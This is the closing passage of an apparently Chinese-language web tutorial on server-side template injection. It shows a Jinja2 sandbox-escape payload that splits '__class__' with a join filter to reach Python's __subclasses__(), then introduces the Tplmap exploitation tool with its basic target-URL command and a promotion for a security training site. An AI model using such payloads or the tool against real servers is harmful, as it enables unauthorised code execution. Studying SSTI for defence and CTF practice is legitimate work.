<span class="p">{{[]</span><span class="o">.</span><span class="fm">__getattribute__</span><span class="p">([</span><span class="s1">&#39;__c&#39;</span><span class="p">,</span><span class="s1">&#39;lass__&#39;</span><span class="p">]</span><span class="o">|</span><span class="n">join</span><span class="p">)</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">]}}</span> </code></pre></div><h2>Tplmap🔱</h2><blockquote>服务器端模板注入和代码注入检测与开发工具</blockquote><p>一个 python 工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用 SSTI 来访问目标文件或操作系统。一些受支持的模板引擎包括 PHP、Ruby、JaveScript、Python、ERB、Jinja2 和 Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。</p><p><b>使用💢</b></p><p>获取：<a href="https://link.zhihu.com/?target=https%3A//github.com/epinna/tplmap" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">github.com/epinna/tplma</span><span class="invisible">p</span><span class="ellipsis"></span></a></p><p>安装第三方依赖：</p><div class="highlight"><pre><code class="language-bash">pip install -r requirements</code></pre></div><p>Tplmap 不仅利用了文件系统的漏洞，而且还具有使用不同参数访问底层操作系统的能力。以下屏幕截图显示了可用于访问操作系统的不同参数选项。</p><p>以下命令可用于测试目标URL中的易受攻击的参数。</p><div class="highlight"><pre><code class="language-text">./tplmap.py -u &lt;&#39;目标网址&#39;&gt;</code></pre></div><p>执行该命令后，该工具会针对多个插件测试目标 URL 以查找代码注入机会。</p><p>有关 <b>SSTI</b> 的内容就简单介绍到这里，向作者致敬。更多有关内容请前往 <a href="https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm" class=" wrap external" target="_blank" rel="nofollow noreferrer">二向箔安全</a> 进行学习，最近推出了一系列免费的网络安全技能包，有关CTF、渗透测试、网络攻防、黑客技巧尽在其中，学它涨姿势💯。</p><figure data-size="normal"><noscript><img src="https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg" data-caption="" data-size="normal" data-rawwidth="720" data-rawheight="403" class="origin_image zh-lightbox-thumb" width="720" data-original="https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg" data-caption="" data-size="normal" data-rawwidth="720" data-rawheight="403" class="origin_image zh-lightbox-thumb lazy" width="720" data-original="https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg"/></figure>
<script async defer="defer" src="https://www.googletagmanager.com/gtag/js?id=UA-7909075-5"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){ dataLayer.push(arguments); }
gtag('js', new Date());
gtag('config', 'UA-7909075-5');
</script>
<script>
var _hmt = _hmt || [];
</script>
<script async defer="defer" src="https://hm.baidu.com/hm.js?e3d40295e416616ddc21287da9646d31"></script>
</body>
</html>
